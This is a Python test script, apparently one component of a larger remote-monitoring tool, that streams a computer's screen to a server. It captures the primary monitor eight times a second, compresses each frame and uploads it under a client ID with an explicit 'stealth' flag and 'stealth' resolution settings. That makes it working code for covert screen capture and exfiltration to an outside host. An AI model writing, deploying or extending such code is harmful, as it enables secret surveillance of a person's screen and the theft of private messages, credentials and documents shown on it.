#!/usr/bin/env python3
"""
Stealth Video Streaming Test
Test continuous video streaming dengan optimized resolution (360p-720p) dan stealth mode
"""

import mss
import base64
from PIL import Image
import io
import requests
import time
import sys
import os
from datetime import datetime

# Add src to path
sys.path.append('src')
from core.config import Config

class StealthVideoStreamer:
    def __init__(self):
        self.client_id = Config.CLIENT_ID
        self.server_url = Config.SERVER_URL
        self.sequence = 1
        self.fps = 8  # Stealth FPS
        self.quality_settings = {
            'low': (640, 360, 60),      # 360p - Stealth
            'medium': (854, 480, 70),   # 480p - Stealth  
            'high': (1280, 720, 75)     # 720p - Stealth
        }
        self.current_quality = 'medium'  # Default stealth quality
        
    def capture_frame(self, quality='medium'):
        """Capture stealth frame dengan specified quality"""
        width, height, jpeg_quality = self.quality_settings[quality]
        
        with mss.mss() as sct:
            monitor = sct.monitors[1]  # Primary monitor
            screenshot = sct.grab(monitor)
            img = Image.frombytes('RGB', screenshot.size, screenshot.bgra, 'raw', 'BGRX')
            
            # Resize to stealth resolution
            img = img.resize((width, height), Image.Resampling.LANCZOS)
            
            # Convert to base64 JPEG
            buffer = io.BytesIO()
            img.save(buffer, format='JPEG', quality=jpeg_quality)
            return base64.b64encode(buffer.getvalue()).decode('utf-8')
    
    def upload_frame(self, frame_data):
        """Upload stealth frame to streaming endpoint"""
        try:
            response = requests.post(
                f'{self.server_url}/api/stream/chunk/{self.client_id}', 
                json={
                    'chunk': frame_data, 
                    'sequence': self.sequence,
                    'stealth': True,
                    'quality': self.current_quality
                },
                timeout=2
            )
            return response.status_code == 200
        except Exception as e:
            print(f'⚠️  Upload error: {e}')
            return False
    
    def start_streaming(self, duration=60):
        """Start stealth video streaming"""
        print(f'🎥 Starting stealth video streaming...')
        print(f'📊 Quality: {self.current_quality.title()} ({self.quality_settings[self.current_quality][0]}x{self.quality_settings[self.current_quality][1]})')
        print(f'⚡ FPS: {self.fps} (Stealth Rate)')
        print(f'🕐 Duration: {duration}s')
        print(f'🔒 Client ID: {self.client_id[:8]}...')
        print('─' * 60)
        
        start_time = time.time()
        frame_interval = 1.0 / self.fps
        successful_frames = 0
        total_frames = 0
        
        try:
            while time.time() - start_time < duration:
                # Capture stealth frame
                frame_data = self.capture_frame(self.current_quality)
                
                # Upload frame
                if self.upload_frame(frame_data):
                    successful_frames += 1
                    print(f'📡 Frame {self.sequence:03d}: ✅ Stealth active - {datetime.now().strftime("%H:%M:%S")}')
                else:
                    print(f'📡 Frame {self.sequence:03d}: ❌ Upload failed')
                
                self.sequence += 1
                total_frames += 1
                
                # Stealth sleep
                time.sleep(frame_interval)
                
        except KeyboardInterrupt:
            print('\n🛑 Stealth streaming stopped by user')
        
        # Stats
        success_rate = (successful_frames / total_frames * 100) if total_frames > 0 else 0
        print('─' * 60)
        print(f'📈 Streaming completed:')
        print(f'   • Total frames: {total_frames}')
        print(f'   • Successful: {successful_frames}')
        print(f'   • Success rate: {success_rate:.1f}%')
        print(f'   • Average FPS: {total_frames / (time.time() - start_time):.1f}')
        print('✅ Stealth video streaming test complete')

if __name__ == '__main__':
    streamer = StealthVideoStreamer()
    
    # Test different qualities
    if len(sys.argv) > 1:
        quality = sys.argv[1]
        if quality in streamer.quality_settings:
            streamer.current_quality = quality
    
    duration = 30  # 30 seconds test
    if len(sys.argv) > 2:
        duration = int(sys.argv[2])
    
    streamer.start_streaming(duration)
